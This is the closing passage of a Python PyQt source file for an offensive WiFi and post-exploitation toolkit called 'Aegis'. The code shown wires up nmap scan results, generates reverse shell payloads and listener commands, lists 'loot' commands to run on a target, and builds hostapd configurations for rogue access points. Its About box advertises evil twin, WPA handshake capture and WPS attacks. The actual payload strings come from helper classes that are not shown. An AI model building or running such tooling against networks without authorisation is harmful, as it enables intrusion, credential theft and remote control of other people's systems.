        self.nmap_scanner.scan_progress.connect(self._on_nmap_progress)
        self.nmap_scanner.host_found.connect(self._on_nmap_host_found)
        self.nmap_scanner.scan_complete.connect(self._on_nmap_complete)
        self.nmap_scanner.start()

        self.nmap_start_btn.setEnabled(False)
        self.nmap_stop_btn.setEnabled(True)
        self.post_terminal.append_info(f"Starting nmap {scan_type} scan on {target}")

    def _stop_nmap(self):
        if self.nmap_scanner:
            self.nmap_scanner.stop()

        self.nmap_start_btn.setEnabled(True)
        self.nmap_stop_btn.setEnabled(False)

    def _on_nmap_progress(self, status: str):
        self.post_terminal.append_output(status)

    def _on_nmap_host_found(self, host: NmapHost):
        row = self.nmap_results.rowCount()
        self.nmap_results.insertRow(row)

        self.nmap_results.setItem(row, 0, QTableWidgetItem(host.ip))
        self.nmap_results.setItem(row, 1, QTableWidgetItem(host.hostname))
        self.nmap_results.setItem(row, 2, QTableWidgetItem(host.mac))
        self.nmap_results.setItem(row, 3, QTableWidgetItem(host.vendor))

        ports_str = ",".join([f"{p['port']}/{p['state']}" for p in host.ports[:5]])
        if len(host.ports) > 5:
            ports_str += f" (+{len(host.ports)-5} more)"
        self.nmap_results.setItem(row, 4, QTableWidgetItem(ports_str))

        services_str = ",".join([p['service'] for p in host.services[:3]])
        self.nmap_results.setItem(row, 5, QTableWidgetItem(services_str))

        self.post_terminal.append_success(f"Found: {host.ip} ({host.hostname}) - {ports_str}")

    def _on_nmap_complete(self, hosts: List[NmapHost]):
        self.post_terminal.append_success(f"Nmap scan complete. Found {len(hosts)} hosts.")
        self.nmap_start_btn.setEnabled(True)
        self.nmap_stop_btn.setEnabled(False)

    def _generate_shells(self):
        """Generate reverse shell payloads"""
        lhost = self.shell_lhost.text().strip()
        lport = self.shell_lport.value()

        if not lhost:
            # Try to auto-detect
            local_info = NetworkContextChecker.get_local_info()
            lhost = local_info['ip']
            if lhost == 'Unknown':
                QMessageBox.warning(self, "Error", "Enter LHOST or connect to network")
                return

        shells = ReverseShellGenerator.generate_shells(lhost, lport)

        output = f"# Reverse Shells for {lhost}:{lport}\n\n"

        for name, shell in shells.items():
            output += f"## {name.upper()}\n{shell}\n\n"

        output += f"\n# Listener Commands\n"
        listeners = ReverseShellGenerator.get_listener_command(lport)
        for name, cmd in listeners.items():
            output += f"## {name}\n{cmd}\n\n"

        self.shell_output.setText(output)
        self.post_terminal.append_success("Reverse shells generated")

    def _collect_loot(self):
        """Collect loot from target"""
        loot_cmds = LootCollector.get_loot_commands()

        self.post_terminal.append_info("Available loot commands:")

        for category, info in loot_cmds.items():
            self.post_terminal.append_cyan(f"\n### {info['name']} ({category})")
            for cmd in info['commands']:
                self.post_terminal.append_yellow(f"  {cmd}")

        self.loot_display.setText("Loot collection ready.\n\nRun commands on target system and capture output.\nUse the terminal below to execute commands.")

        # Add to loot
        loot = CapturedLoot(
            target="local",
            loot_type="commands",
            content=json.dumps(loot_cmds, indent=2)
        )
        self.loot.append(loot)

    def _clear_loot(self):
        self.loot.clear()
        self.loot_display.clear()
        self.post_terminal.append_info("Loot cleared")

    # =========================================================================
    # MANUAL BUILDER
    # =========================================================================

    def _generate_config(self):
        ssid = self.manual_ssid.text()
        channel = self.manual_channel.value()
        security = self.manual_security.currentText()
        password = self.manual_password.text()

        config = f"""interface=wlan0
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
wmm_enabled=1
auth_algs=1
"""

        if security == "WPA2":
            config += f"""wpa=2
wpa_passphrase={password}
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
rsn_pairwise=CCMP
"""
        elif security == "WPA3":
            config += f"""wpa=3
wpa_passphrase={password}
wpa_key_mgmt=SAE
wpa_pairwise=CCMP
"""

        self.config_preview.setText(config)
        self.manual_terminal.append_success("Configuration generated")

    # =========================================================================
    # MENU ACTIONS
    # =========================================================================

    def _check_dependencies(self):
        deps = ["airodump-ng", "aireplay-ng", "hostapd", "dnsmasq", "reaver", "nmap", "macchanger"]
        found, missing = [], []

        for dep in deps:
            result = subprocess.run(["which", dep], capture_output=True)
            if result.returncode == 0:
                found.append(dep)
            else:
                missing.append(dep)

        msg = "Found:\n" + "\n".join(found) + "\n\nMissing:\n" + ("\n".join(missing) if missing else "None")
        QMessageBox.information(self, "Dependencies", msg)

    def _show_about(self):
        QMessageBox.about(self, "About", f"""
{APP_NAME} v{APP_VERSION}

Advanced WiFi & Post-Exploitation Framework

Features:
- Network Reconnaissance
- Evil Twin / Honeypot
- Handshake Capture
- WPS Attacks
- Post-Exploitation (Nmap, Shells, Loot)

⚠️ AUTHORIZED PENETRATION TESTING ONLY!
        """)

    def closeEvent(self, event):
        """Cleanup on close"""
        self._stop_scanner()
        self._stop_evil_twin()
        self._stop_wps_attack()
        self._stop_handshake_capture()
        self._stop_nmap()

        subprocess.run(["sudo", "killall", "hostapd", "dnsmasq", "airodump-ng"],
                      capture_output=True)

        event.accept()


# ============================================================================
# MAIN
# ============================================================================

def main():
    if os.geteuid() != 0:
        print("ERROR: This application must be run as root!")
        print("Usage: sudo python3 aegis_wifi.py")
        sys.exit(1)

    app = QApplication(sys.argv)
    window = AegisGUI()
    window.show()
    sys.exit(app.exec_())


if __name__ == "__main__":
    main()
